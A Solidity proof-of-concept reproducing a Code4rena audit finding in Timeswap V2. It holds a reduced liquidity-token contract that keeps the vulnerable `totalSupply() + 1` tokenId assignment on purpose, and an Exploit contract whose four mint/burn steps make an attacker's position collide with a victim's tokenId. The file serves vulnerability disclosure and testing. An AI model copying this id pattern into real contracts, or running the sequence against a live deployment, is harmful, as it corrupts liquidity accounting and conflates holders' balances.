// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;

/*//////////////////////////////////////////////////////////////////////////
    Timeswap V2 — [H-02] TimeswapV2LiquidityToken should not use
    `totalSupply()+1` as tokenId
    Finding 24902 (Code4rena 2023-01) — HIGH

    Root cause: TimeswapV2LiquidityToken.mint assigns a new ERC-1155 tokenId
    for a fresh liquidity position with `id = totalSupply() + 1`. totalSupply()
    (from ERC1155Enumerable = `_allTokens.length`) can DECREASE when a tokenId
    is fully burned. So after a position is fully burned, a subsequently-created
    position is assigned a tokenId that COLLIDES with an existing position —
    two distinct liquidities end up sharing one tokenId, corrupting LP
    accounting (the id->position registry is overwritten and the two positions'
    ERC-1155 balances are conflated).

    This is a self-contained reduction. The vulnerable id-assignment block in
    `mint()` is copied VERBATIM (the `id = totalSupply() + 1` line preserved).
    The pool/option factories, reentrancy guard, mint/burn callbacks and
    Error.checkEnough (all irrelevant to the tokenId bug) are stripped; a
    minimal ERC1155Enumerable reproduces the `totalSupply() == _allTokens.length`
    semantics. Per the finding, `_removeTokenEnumeration` is PATCHED (decrement
    before the zero-check) so a fully-burned tokenId actually decrements
    totalSupply — the precondition that makes the collision exploitable (the
    deployed enumerable has a separate bug that masks it; the finding rates this
    HIGH once that is fixed, and provides exactly this patch in its PoC).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Struct for Liquidity Token — copied from Timeswap's structs/Position.sol.
struct TimeswapV2LiquidityTokenPosition {
    address token0;
    address token1;
    uint256 strike;
    uint256 maturity;
}

library PositionLibrary {
    /// @dev return keccak for key management for Liquidity Token (verbatim).
    function toKey(TimeswapV2LiquidityTokenPosition memory p) internal pure returns (bytes32) {
        return keccak256(abi.encode(p));
    }
}

/// @dev Minimal mint parameter struct (subset of Timeswap's TimeswapV2LiquidityTokenMintParam).
struct MintParam {
    address token0;
    address token1;
    uint256 strike;
    uint256 maturity;
    address to;
    uint160 liquidityAmount;
}

/// @dev Minimal burn parameter struct (subset of TimeswapV2LiquidityTokenBurnParam).
struct BurnParam {
    address token0;
    address token1;
    uint256 strike;
    uint256 maturity;
    address from;
    uint160 liquidityAmount;
}

/// @notice Minimal, faithful ERC1155Enumerable: reproduces
///         `totalSupply() == _allTokens.length` and the per-id supply tracking
///         from Timeswap's base/ERC1155Enumerable.sol. Owner-enumeration
///         (irrelevant to the tokenId collision) is omitted. `_removeTokenEnumeration`
///         is the PATCHED version from the finding.
abstract contract ERC1155Enumerable {
    // balanceOf[account][id]
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    // per-id total supply
    mapping(uint256 => uint256) public idTotalSupply;

    // Array with all token ids, used for enumeration
    uint256[] internal _allTokens;
    mapping(uint256 => uint256) internal _allTokensIndex;

    /// @dev totalSupply() == _allTokens.length (verbatim semantics).
    function totalSupply() public view returns (uint256) {
        return _allTokens.length;
    }

    function _addTokenToAllTokensEnumeration(uint256 tokenId) private {
        _allTokensIndex[tokenId] = _allTokens.length;
        _allTokens.push(tokenId);
    }

    function _removeTokenFromAllTokensEnumeration(uint256 tokenId) private {
        uint256 lastTokenIndex = _allTokens.length - 1;
        uint256 tokenIndex = _allTokensIndex[tokenId];
        uint256 lastTokenId = _allTokens[lastTokenIndex];
        _allTokens[tokenIndex] = lastTokenId;
        _allTokensIndex[lastTokenId] = tokenIndex;
        delete _allTokensIndex[tokenId];
        _allTokens.pop();
    }

    /// @dev from base/ERC1155Enumerable.sol `_addTokenEnumeration` (mint path).
    function _addTokenEnumeration(uint256 id, uint256 amount) internal {
        // from == address(0) on a mint
        if (idTotalSupply[id] == 0) _addTokenToAllTokensEnumeration(id);
        idTotalSupply[id] += amount;
    }

    /// @dev from base/ERC1155Enumerable.sol `_removeTokenEnumeration` (burn path),
    ///      PATCHED per the finding: decrement idTotalSupply BEFORE the zero-check
    ///      so totalSupply drops when a tokenId is fully burned.
    function _removeTokenEnumeration(uint256 id, uint256 amount) internal {
        // to == address(0) on a burn
        idTotalSupply[id] -= amount;
        if (idTotalSupply[id] == 0) _removeTokenFromAllTokensEnumeration(id);
    }

    function _mint(address to, uint256 id, uint256 amount, bytes memory) internal {
        _addTokenEnumeration(id, amount);
        balanceOf[to][id] += amount;
    }

    function _burn(address from, uint256 id, uint256 amount) internal {
        balanceOf[from][id] -= amount;
        _removeTokenEnumeration(id, amount);
    }
}

/// @notice Reduced TimeswapV2LiquidityToken. The `mint()` tokenId-assignment
///         block is copied VERBATIM from the audited source (the `id =
///         totalSupply() + 1` line preserved). Pool/option factory lookups,
///         the reentrancy guard, the mint/burn callbacks and Error.checkEnough
///         are elided — none affect the tokenId bug.
contract TimeswapV2LiquidityToken is ERC1155Enumerable {
    using PositionLibrary for TimeswapV2LiquidityTokenPosition;

    mapping(uint256 => TimeswapV2LiquidityTokenPosition) public _timeswapV2LiquidityTokenPositions;
    mapping(bytes32 => uint256) public _timeswapV2LiquidityTokenPositionIds;

    function mint(MintParam calldata param) external {
        TimeswapV2LiquidityTokenPosition memory timeswapV2LiquidityTokenPosition = TimeswapV2LiquidityTokenPosition({
            token0: param.token0,
            token1: param.token1,
            strike: param.strike,
            maturity: param.maturity
        });

        bytes32 key = timeswapV2LiquidityTokenPosition.toKey();
        uint256 id = _timeswapV2LiquidityTokenPositionIds[key];

        // if the position does not exist, create it
        if (id == 0) {
            id = totalSupply() + 1; // @> VULN: totalSupply() can DECREASE (fully-burned id), so a new position reuses an existing tokenId
            _timeswapV2LiquidityTokenPositions[id] = timeswapV2LiquidityTokenPosition;
            _timeswapV2LiquidityTokenPositionIds[key] = id;
        }

        // mint the liquidity tokens to the recipient
        _mint(param.to, id, param.liquidityAmount, bytes(""));
    }

    function burn(BurnParam calldata param) external {
        bytes32 key = TimeswapV2LiquidityTokenPosition({
            token0: param.token0,
            token1: param.token1,
            strike: param.strike,
            maturity: param.maturity
        }).toKey();

        // burn the liquidity tokens from the holder
        _burn(param.from, _timeswapV2LiquidityTokenPositionIds[key], param.liquidityAmount);
    }

    // convenience view for the PoC
    function idOf(address token0, address token1, uint256 strike, uint256 maturity) external view returns (uint256) {
        return _timeswapV2LiquidityTokenPositionIds[
            PositionLibrary.toKey(TimeswapV2LiquidityTokenPosition(token0, token1, strike, maturity))
        ];
    }
}

/// @notice Orchestrates the finding's 4-step attack in one tx (no cheatcodes):
///   1. mint position A (token0/1)        -> tokenId 1
///   2. mint position B (token2/3)        -> tokenId 2
///   3. burn all of A                     -> totalSupply drops 2 -> 1
///   4. mint position C (token4/5)        -> tokenId = totalSupply()+1 = 2 (COLLISION with B)
/// Position B is minted to a VICTIM and position C to the ATTACKER, so the
/// collision conflates two different holders' balances under one tokenId.
contract Exploit {
    TimeswapV2LiquidityToken public lt;

    // distinct token pairs -> distinct position keys
    address constant A0 = address(0xA0);
    address constant A1 = address(0xA1);
    address constant B0 = address(0xB0);
    address constant B1 = address(0xB1);
    address constant C0 = address(0xC0);
    address constant C1 = address(0xC1);

    uint256 constant STRIKE = 1e18;
    uint256 constant MATURITY = 2_000_000_000;

    address constant VICTIM = address(0x5151);
    address public attacker;

    uint160 constant AMT_A = 100;
    uint160 constant AMT_B = 100;
    uint160 constant AMT_C = 100;

    // observable results
    uint256 public idA;
    uint256 public idB;
    uint256 public idC;

    constructor() {
        attacker = msg.sender;
        lt = new TimeswapV2LiquidityToken();
    }

    function run() external {
        // 1. mint position A (attacker) -> id 1
        lt.mint(MintParam(A0, A1, STRIKE, MATURITY, address(this), AMT_A));
        idA = lt.idOf(A0, A1, STRIKE, MATURITY);

        // 2. mint position B (victim) -> id 2
        lt.mint(MintParam(B0, B1, STRIKE, MATURITY, VICTIM, AMT_B));
        idB = lt.idOf(B0, B1, STRIKE, MATURITY);

        // 3. burn all of A -> totalSupply drops from 2 to 1 (patched enumerable)
        lt.burn(BurnParam(A0, A1, STRIKE, MATURITY, address(this), AMT_A));

        // 4. mint position C (attacker) -> id = totalSupply()+1 = 2 (COLLISION with B)
        lt.mint(MintParam(C0, C1, STRIKE, MATURITY, address(this), AMT_C));
        idC = lt.idOf(C0, C1, STRIKE, MATURITY);

        // ===== HARM =====
        // (a) Two distinct positions (B: token2/3, C: token4/5) share one tokenId.
        require(idB == 2 && idC == 2, "expected collision on tokenId 2");
        require(idC == idB, "COLLISION not reproduced - bug absent");

        // (b) The id->position registry for B was silently OVERWRITTEN by C:
        //     tokenId 2 now describes C's pair, destroying B's on-chain identity.
        (address regToken0,,,) = lt._timeswapV2LiquidityTokenPositions(idB);
        require(regToken0 == C0, "registry[2] should have been overwritten to C");

        // (c) The two holders' balances are conflated under tokenId 2, and the
        //     per-id supply is the SUM of two unrelated positions — corrupt
        //     accounting the protocol cannot untangle.
        require(lt.balanceOf(VICTIM, 2) == AMT_B, "victim B balance under id 2");
        require(lt.balanceOf(address(this), 2) == AMT_C, "attacker C balance under id 2");
        require(lt.idTotalSupply(2) == uint256(AMT_B) + AMT_C, "id 2 supply should conflate B + C");
    }
}
